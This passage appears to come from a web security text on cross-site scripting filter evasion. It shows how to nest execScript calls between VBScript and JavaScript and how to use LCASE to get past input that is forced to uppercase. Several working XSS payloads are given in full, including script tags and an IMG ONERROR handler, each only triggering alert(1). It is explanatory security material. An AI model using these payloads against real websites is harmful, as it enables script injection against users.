Combining VBScript and JavaScript To add further layers of complexity to your attack, and circumvent some filters, 
you can call into VBScript from JavaScript, and vice versa:
<script>execScript("MsgBox 1","vbscript");</script>
<script language=vbs>execScript("alert(1)")</script>
 You can even nest these calls and ping-pong between the languages as required: 
 <script>execScript('execScript "alert(1)","javascript"',"vbscript");</script>
 As mentioned, VBScript is case-insensitive, allowing you to execute code in contexts where your input is converted to
 uppercase. If you really want to call JavaScript functions in these situations, you can use string manipulation 
 functions within VBScript to construct a command with the required case and then execute this using JavaScript:
 <SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE("ALERT(1)")) </SCRIPT>
<IMG ONERROR="VBS:EXECSCRIPT LCASE('ALERT(1)')" SRC=A>
